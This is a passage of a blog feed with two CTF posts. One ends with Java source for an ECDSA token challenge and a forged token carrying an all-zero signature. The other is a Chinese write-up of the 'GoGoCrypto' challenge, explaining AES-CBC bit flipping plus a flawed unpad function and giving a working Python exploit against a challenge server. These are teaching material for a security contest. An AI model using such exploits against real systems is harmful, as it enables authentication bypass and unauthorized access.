class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(Base64.getUrlDecoder().decode(payloadB64));</span><br><span class="line">            <span class="type">JSONObject</span> <span class="variable">payload</span> <span class="operator">=</span> JSON.parseObject(payloadDecodeString);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(!payload.getString(<span class="string">&quot;name&quot;</span>).equals(user)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (payload.getLong(<span class="string">&quot;exp&quot;</span>) &lt; System.currentTimeMillis()) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> payload.getBoolean(<span class="string">&quot;admin&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;   </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getFlag</span><span class="params">(String token, ECPublicKey ecPublicKey, String user)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">err</span> <span class="operator">=</span> <span class="string">&quot;You are not the administrator.&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(checkAdmin(token, ecPublicKey, user)) &#123;</span><br><span class="line">            <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;/root/task/flag.txt&quot;</span>);</span><br><span class="line">            <span class="type">BufferedReader</span> <span class="variable">br</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">FileReader</span>(file));</span><br><span class="line">            <span class="type">String</span> <span class="variable">flag</span> <span class="operator">=</span> br.readLine();</span><br><span class="line">            br.close();</span><br><span class="line">            <span class="keyword">return</span> flag;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> err;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">task</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        System.out.print(<span class="string">&quot;your name:&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">user</span> <span class="operator">=</span> input.nextLine().strip();</span><br><span class="line">        System.out.print(String.format(<span class="string">&quot;hello %s, let&#x27;s start your challenge.\n&quot;</span>, user));</span><br><span class="line">        <span class="type">KeyPair</span> <span class="variable">keyPair</span> <span class="operator">=</span> ecdsa.keyGen();</span><br><span class="line">        <span class="type">ECPrivateKey</span> <span class="variable">ecPrivateKey</span> <span class="operator">=</span> (ECPrivateKey) keyPair.getPrivate();</span><br><span class="line">        <span class="type">ECPublicKey</span> <span class="variable">ecPublicKey</span> <span class="operator">=</span> (ECPublicKey) keyPair.getPublic();</span><br><span class="line">        <span class="type">String</span> <span class="variable">menu</span> <span class="operator">=</span> <span class="string">&quot;1.generate token\n2.getflag\n&gt;&quot;</span>;</span><br><span class="line">        <span class="type">Integer</span> <span class="variable">choice</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">Integer</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (count &lt;= <span class="number">10</span>) &#123;</span><br><span class="line">            count++;</span><br><span class="line">            System.out.print(menu);</span><br><span class="line">            choice = Integer.parseInt(input.nextLine().strip());</span><br><span class="line">            <span class="keyword">if</span>(choice == <span class="number">1</span>) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">token</span> <span class="operator">=</span> generateToken(user, ecPrivateKey);</span><br><span class="line">                System.out.println(token);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (choice == <span class="number">2</span>) &#123;</span><br><span class="line">                System.out.print(<span class="string">&quot;your token:&quot;</span>);</span><br><span class="line">                <span class="type">String</span> <span class="variable">token</span> <span class="operator">=</span> input.nextLine().strip();</span><br><span class="line">                <span class="type">String</span> <span class="variable">flag</span> <span class="operator">=</span> getFlag(token, ecPublicKey, user);</span><br><span class="line">                System.out.println(flag);</span><br><span class="line">                input.close();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                input.close();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        task();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJteUVTIn0=.eyJpc3MiOiJxd2IiLCJuYW1lIjoiV2Fua2tvIFJlZSIsImFkbWluIjp0cnVlLCJleHAiOjE3NTkzMjEzMjg0Mzh9.AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;/&gt;

&lt;h2 id=&quot;介绍&quot;&gt;&lt;a href=&quot;#介绍&quot; class=&quot;headerlink&quot; title=&quot;介绍&quot;&gt;&lt;/a&gt;介绍&lt;/h2&gt;&lt;p&gt;ECDSA代表椭圆曲线数字签名算法，与旧的RS</summary>
      
    
    
    
    
    <category term="vul" scheme="http://example.com/tags/vul/"/>
    
  </entry>
  
  <entry>
    <title>GoGoCrypto_writeup</title>
    <link href="http://example.com/2023/12/27/GoGoCrypto-writeup/"/>
    <id>http://example.com/2023/12/27/GoGoCrypto-writeup/</id>
    <published>2023-12-26T16:10:28.000Z</published>
    <updated>2023-12-27T07:39:37.663Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><p>本人参与极客大挑战2023的出题工作，主要负责密码学板块。</p><p>对于GoGoCrypto这道反响比较高的题目，这里附上题解。</p><p><a href="https://github.com/AL3XEI709/Geek23/blob/main/GoGoCrypto/GoGoCrypto_setup.zip">题目源码</a></p><p>这题用Golang写了一个Flag Folder的交互，流程大概长这样：</p><p><img src="https://gitee.com/alekseyp/picgo/raw/master/img/202312270044077.png" alt="image-20231227004357980"></p><p>加解密采用的算法是AES的CBC mod。</p><p><img src="https://gitee.com/alekseyp/picgo/raw/master/img/202312270045335.png" alt="image-20231227004502286"></p><p>这种加密算法的主要攻击手段是<strong>字节翻转（bit flipping）</strong>，这种攻击的前提是一个明文分组是已知的。</p><p>sid是16字节，根据填充算法：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Pad</span><span class="params">(pt []<span class="type">byte</span>)</span></span> []<span class="type">byte</span> &#123;</span><br><span class="line">padlen := aes.BlockSize - (<span class="built_in">len</span>(pt) % aes.BlockSize)</span><br><span class="line">padding := bytes.Repeat([]<span class="type">byte</span>&#123;<span class="type">byte</span>(padlen)&#125;, padlen)</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">append</span>(pt, padding...)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以知道填充后有两块：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">block#1 block#2</span><br><span class="line">+-----------------+-----------------+</span><br><span class="line">| sid | Padding (&quot;\x10&quot;*16) |</span><br><span class="line">+-----------------+-----------------+</span><br></pre></td></tr></table></figure><p>那么我们就能修改第一个密文分组，来控制解密后的第</p><p>二个明文分组。具体的原理是：</p><p><img src="https://gitee.com/alekseyp/picgo/raw/master/img/202312270047773.png" alt="image-20231227004700688"></p><p>这一步显然会破坏第一块的明文，但并不影响我们的利用。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Unpad</span><span class="params">(pt []<span class="type">byte</span>)</span></span> []<span class="type">byte</span> &#123;</span><br><span class="line">padlen := <span class="type">int</span>(pt[<span class="built_in">len</span>(pt)<span class="number">-1</span>])</span><br><span class="line"><span class="keyword">return</span> pt[:<span class="built_in">len</span>(pt)-padlen]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>unpad函数只是将padding的最后一个字节作为padding长度，根本不检查，所以我们可以很容易的让padding长度为len(plaintext) - 1，那么我们就可以得到一个只有一个字节的明文了！</p><p>因此攻击流程是：</p><ul><li><p>修改密文并上传</p></li><li><p>服务端解密，得到只有一个字节的明文</p></li><li><p>遍历所有明文（254），必然得到flag。</p></li></ul><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os </span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> unquote </span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode <span class="keyword">as</span> dec, b64encode <span class="keyword">as</span> enc </span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> xor </span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha512 </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">curl_request</span>(<span class="params">url, method=<span class="string">&#x27;GET&#x27;</span>, headers=<span class="literal">None</span>, data=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> method.upper() == <span class="string">&#x27;GET&#x27;</span>:</span><br><span class="line">            response = requests.get(url, headers=headers)</span><br><span class="line">        <span class="keyword">elif</span> method.upper() == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">            response = requests.post(url, headers=headers, data=data)</span><br><span class="line">        <span class="keyword">elif</span> method.upper() == <span class="string">&#x27;PUT&#x27;</span>:</span><br><span class="line">            response = requests.put(url, headers=headers, data=data)</span><br><span class="line">        <span class="keyword">elif</span> method.upper() == <span class="string">&#x27;DELETE&#x27;</span>:</span><br><span class="line">            response = requests.delete(url, headers=headers, data=data)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Unsupported HTTP method&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 检查请求是否成功</span></span><br><span class="line">        response.raise_for_status()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> response.text</span><br><span class="line">    <span class="keyword">except</span> requests.exceptions.RequestException <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Error: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">url = <span class="string">&#x27;http://47.109.106.62:7842/&#x27;</span> </span><br><span class="line">response = requests.get(url) </span><br><span class="line">x = <span class="built_in">str</span>(response.headers)</span><br><span class="line"></span><br><span class="line">token = unquote(x.split(<span class="string">&quot;token&quot;</span>)[<span class="number">1</span>].split(<span class="string">&quot;;&quot;</span>)[<span class="number">0</span>][<span class="number">1</span>:])  </span><br><span class="line">token = dec(token) </span><br><span class="line">nonce = unquote(x.split(<span class="string">&quot;nonce&quot;</span>)[<span class="number">1</span>].split(<span class="string">&quot;;&quot;</span>)[<span class="number">0</span>][<span class="number">1</span>:])  </span><br><span class="line"></span><br><span class="line">c1, c2 = token[:<span class="built_in">len</span>(token)//<span class="number">2</span>], token[<span class="built_in">len</span>(token)//<span class="number">2</span>:] </span><br><span class="line">c1 = xor(xor(c1,<span class="string">b&#x27;\x10&#x27;</span>*<span class="number">16</span>),<span class="string">b&#x27;\x1f&#x27;</span>*<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">form_data = &#123;</span><br><span class="line">    <span class="string">&quot;Rec&quot;</span>: enc(c1+c2).decode()</span><br><span class="line">&#125;</span><br><span class="line">res = curl_request(<span class="string">&#x27;http://47.109.106.62:7842/api/dec&#x27;</span>, method=<span class="string">&#x27;POST&#x27;</span>, headers=<span class="literal">None</span>, data=form_data) </span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    form_data = &#123;</span><br><span class="line">        <span class="string">&quot;Password&quot;</span>: enc(<span class="built_in">chr</span>(i).encode()).decode()+enc(sha512(dec(nonce)).digest()).decode()</span><br><span class="line">    &#125;</span><br><span class="line">    res = curl_request(<span class="string">&#x27;http://47.109.106.62:7842/api/check&#x27;</span>, method=<span class="string">&#x27;POST&#x27;</span>, headers=<span class="literal">None</span>, data=form_data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;SYC&quot;</span> <span class="keyword">in</span> <span class="built_in">str</span>(res):</span><br><span class="line">        <span class="built_in">print</span>(res) </span><br><span class="line">        <span class="keyword">break</span> </span><br><span class="line"><span class="comment"># &#123;&quot;check&quot;:&quot;true&quot;,&quot;msg&quot;:&quot;Your flag is: SYC&#123;AL3XEI_FAKE_FLAG&#125;&quot;&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;/&gt;

&lt;p&gt;本人参与极客大挑战2023的出题工作，主要负责密码学板块。&lt;/p&gt;
&lt;p&gt;对于GoGoCrypto这道反响比较高的题目，这里附上题解。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https:</summary>
      
    
    
    
    
    <category term="CTF" scheme="http://example.com/tags/CTF/"/>
    
  </entry>
  
</feed>
